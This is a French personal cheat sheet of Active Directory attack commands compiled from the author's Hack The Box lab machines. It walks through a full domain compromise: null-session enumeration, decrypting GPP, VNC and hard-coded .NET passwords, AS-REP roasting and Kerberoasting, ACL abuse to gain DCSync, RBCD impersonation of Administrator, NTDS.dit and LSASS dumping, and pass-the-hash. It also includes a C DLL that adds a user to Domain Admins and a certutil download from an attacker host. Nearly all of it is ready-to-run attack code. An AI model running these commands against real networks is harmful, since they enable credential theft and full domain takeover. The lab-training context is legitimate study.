# AD — Mémo commandes (récap de toutes mes box)

Aide-mémoire unique, tiré de **Forest, Sauna, Active, Cascade, Blackfield, Resolute, Support**.
Ordre = déroulé d'une compromission AD. `<IP>` = IP cible, `<DOM>` = domaine (ex. `support.htb`), `<DC>` = FQDN du DC.

> ⚠️ **Réflexes qui m'ont fait perdre du temps :**
> - Après **chaque reboot/revert**, l'IP change → **mettre à jour `/etc/hosts`** (sinon `nxc`, `secretsdump`… échouent).
> - Kerberos raisonne en **noms** : toujours `-dc-ip <IP>` + domaine dans `/etc/hosts` (sinon `KDC_ERR_WRONG_REALM`, `Name or service not known`).
> - Cible Kerberos (`-k`) = **FQDN exact du SPN** (`dc.dom.htb`), résolvable — jamais l'IP.
> - Transfert de fichier : `upload`/`download` d'evil-winrm écrivent parfois **0 octet** → préférer **SMB (`copy`)** ou **certutil**, et **toujours `dir`** pour vérifier la taille.

---

## 0. Préparer la résolution de nom

```bash
echo '<IP>  <DOM> dc.<DOM> DC.<DOM>' | sudo tee -a /etc/hosts
```

---

## 1. Reconnaissance

```bash
nmap -sC -sV -p- -oA nmap/<box> <IP>
# ports DC : 53 88 135 139 389 445 464 593 636 3268 5985 9389
```

Reconnaître un DC : **53**(DNS) **88**(Kerberos) **389/636/3268**(LDAP) **445**(SMB) **5985**(WinRM).

---

## 2. Énumération (souvent sans creds)

```bash
# partages
nxc smb <IP> -u '' -p '' --shares
nxc smb <IP> -u guest -p '' --shares

# utilisateurs (session nulle)
rpcclient -U '' -N <IP>            # puis : enumdomusers / queryuser <rid>
nxc smb <IP> -u '' -p '' --users   # affiche les DESCRIPTIONS (mdp planqué ?)
enum4linux -A <IP>

# dump LDAP complet + chercher des secrets
ldapsearch -x -H ldap://<IP> -b 'DC=dom,DC=htb' > ldap.txt
grep -iE 'pwd|pass|legacy|info|description' ldap.txt

# partage profiles$ (Blackfield) → noms de dossiers = users
smbclient -N //<IP>/profiles$ -c 'ls' | grep -oP '^\s+\K[^ ]+(?= +D)' | grep -vE '^\.{1,2}$' > users.txt
# liste users depuis nxc --users (Resolute)
nxc smb <IP> -u '' -p '' --users 2>/dev/null | awk '{print $5}' | grep -vE '^\[|^-|^$' | sort -u > users.txt
```

---

## 3. Récupérer un 1er mot de passe (secrets réversibles)

```bash
# base64 (cascadeLegacyPwd, etc.) — encodage, PAS chiffrement
echo '<b64>' | base64 -d ; echo

# GPP cpassword (Active) — clé AES publiée par MS
gpp-decrypt '<cpassword>'

# VNC (Cascade) — clé DES fixe publique
echo -n '<hexpass>' | xxd -r -p | openssl enc -des-cbc -d --nopad -K e84ad660c4721ae0 -iv 0000000000000000

# binaire .NET (Cascade/Support) : lire la clé en dur puis rejouer en Python
file bin.exe ; strings -e l bin.exe ; monodis bin.exe | grep -iE 'ldstr|key'
# XOR type Support : base64 -> XOR clé -> XOR 0xDF
python3 -c 'import base64;e=base64.b64decode("<b64>");k=b"<key>";print(bytes(e[i]^k[i%len(k)]^0xDF for i in range(len(e))).decode())'
```

---

## 4. Kerberos roasting (hors ligne)

```bash
# AS-REP roast (compte sans pré-auth) — mode hashcat 18200
impacket-GetNPUsers <DOM>/ -no-pass -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip <IP>
nxc ldap <IP> -u <user> -p '' --asreproast asrep.txt        # alternative
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# Kerberoasting (compte avec SPN, creds valides requis) — mode 13100
impacket-GetUserSPNs <DOM>/<user>:'<pass>' -dc-ip <IP> -request -outputfile tgs.txt
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
```

---

## 5. Cartographie — BloodHound CE

```bash
bloodhound-ce-python -u <user> -p '<pass>' -d <DOM> -ns <IP> -c All --zip
# interface http://localhost:8080 → File Ingest → upload le .zip
# Mark <user> as Owned → "Shortest Path to Domain Admins from Owned"
# lire les arêtes : ForceChangePassword / GenericAll / GenericWrite / WriteDacl / AddMember
```

Vérifs locales une fois un shell :
```powershell
whoami /priv        # SeBackupPrivilege, SeImpersonate...
whoami /groups      # DnsAdmins, Backup Operators, Remote Management Users...
net user <user>
```

---

## 6. Abus d'ACL

```bash
# ForceChangePassword (Blackfield) : reset le mdp d'un autre compte
net rpc password <cible> 'NewPass123!' -U "<DOM>/<user>%<pass>" -S <IP>
bloodyAD -u <user> -p '<pass>' -d <DOM> --host <IP> set password <cible> 'NewPass123!'

# WriteDacl sur le domaine (Forest) : s'octroyer DCSync
net rpc user add pwn 'P@ssw0rd123!' -U "<DOM>/<user>%<pass>" -S <IP>
net rpc group addmem "Exchange Windows Permissions" pwn -U "<DOM>/<user>%<pass>" -S <IP>
impacket-dacledit -action write -rights DCSync -principal pwn -target-dn "DC=dom,DC=htb" "<DOM>/pwn:P@ssw0rd123!" -dc-ip <IP>
```

---

## 7. RBCD (Support) — GenericWrite sur un ordinateur

```bash
unset KRB5CCNAME
impacket-addcomputer <DOM>/<user>:'<pass>' -computer-name 'FAKE' -computer-pass 'Pass123!' -dc-ip <IP>
impacket-rbcd <DOM>/<user>:'<pass>' -delegate-to 'DC$' -delegate-from 'FAKE$' -action write -dc-ip <IP>
impacket-rbcd <DOM>/<user>:'<pass>' -delegate-to 'DC$' -action read -dc-ip <IP>     # vérifier
impacket-getST <DOM>/'FAKE$':'Pass123!' -spn 'cifs/<DC>' -impersonate Administrator -dc-ip <IP>
export KRB5CCNAME=$(ls -t *.ccache | head -1)
impacket-secretsdump -k -no-pass <DC> -just-dc-user Administrator
```

---

## 8. Récupérer tous les hashes

```bash
# DCSync (droit de réplication) — Forest/Sauna
impacket-secretsdump <DOM>/<user>:'<pass>'@<IP> -just-dc-user Administrator

# SeBackupPrivilege / Backup Operators (Blackfield) : NTDS.dit + ruche SYSTEM
#  (PS sur la cible) diskshadow /s shadow.txt ; robocopy /b z:\Windows\NTDS . ntds.dit ; reg save HKLM\SYSTEM C
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL

# dump LSASS hors ligne (Blackfield)
pypykatz lsa minidump lsass.DMP
```

> **SAM ≠ NTDS** : `Administrator:500` tiré du SAM = admin **local** (échoue sur un compte domaine). Le hash domaine vient de **NTDS.dit**.

---

## 9. Se connecter avec ce qu'on a

```bash
# mot de passe
evil-winrm -i <IP> -u <user> -p '<pass>'
# Pass-the-Hash (NT hash)
evil-winrm -i <IP> -u Administrator -H <NThash>
# ticket Kerberos (.ccache)
export KRB5CCNAME=ticket.ccache
impacket-wmiexec -k -no-pass <DC>
impacket-psexec  -k -no-pass <DC>
```

---

## 10. DnsAdmins → SYSTEM (Resolute)

```c
// dll.c — compiler : x86_64-w64-mingw32-gcc dll.c -shared -o evil.dll
#include <windows.h>
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p){ if(r==DLL_PROCESS_ATTACH) system("net group \"Domain Admins\" <user> /add /domain"); return TRUE; }
```
```powershell
dnscmd.exe /config /serverlevelplugindll C:\path\evil.dll
sc.exe stop dns ; sc.exe query dns ; sc.exe start dns   # attendre STOPPED avant start
net group "Domain Admins" /domain                        # <user> doit apparaître → RECONNEXION (nouveau jeton)
```
> DLL msfvenom souvent mangée par l'AV → **compiler sa propre DLL**. Codes DNS : `126`=DLL introuvable, `193`=DLL invalide, `0`=OK.

---

## 11. AD Recycle Bin (Cascade)

```powershell
Get-ADGroupMember "AD Recycle Bin"        # qui peut lire les objets supprimés
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties * | Select name,cascadeLegacyPwd
```

---

## 12. Transfert de fichiers (quand evil-winrm déconne)

```bash
# SMB (fiable, écrit le contenu complet)
impacket-smbserver share ~/loot -smb2support            # sans -user/-pass si c'est SYSTEM qui tire
```
```powershell
copy \\<KALI>\share\fichier C:\Windows\Temp\fichier
certutil -urlcache -split -f http://<KALI>:8000/fichier fichier   # (bloqué par AMSI parfois)
dir fichier                                                       # VÉRIFIER la taille
```

---

## Modes hashcat utiles

| Mode | Type |
|---|---|
| 18200 | AS-REP roast |
| 13100 | Kerberoast (TGS) |
| 1000 | NTLM |
| 5600 | NetNTLMv2 (responder) |
| 1400 | SHA-256 |
| 3200 | bcrypt |
